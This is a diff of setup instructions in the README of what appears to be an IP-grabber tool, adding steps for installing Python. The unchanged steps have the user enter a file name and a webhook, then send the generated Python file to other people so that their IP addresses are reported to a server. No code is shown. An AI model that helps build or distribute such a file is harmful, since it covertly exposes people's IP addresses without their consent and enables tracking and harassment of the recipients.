@@ -3,11 +3,18 @@
 Setup:
 
 1. download python (https://python.org)
-2. run setup.bat
-3. run start.bat
-4. enter file name
-5. enter webhook
-6. send people the new python file and their ip will be sent in server
+2. open the file that u downloaded
+3. follow the setup
+4. open it agian and click modify
+5. select all and click next
+6. select all and click next
+7. wait until downloaded
+8. click close
+9. run setup.bat
+10. run start.bat
+11. enter file name
+12. enter webhook
+13. send people the new python file and their ip will be sent in server
 
 #-----------------
 
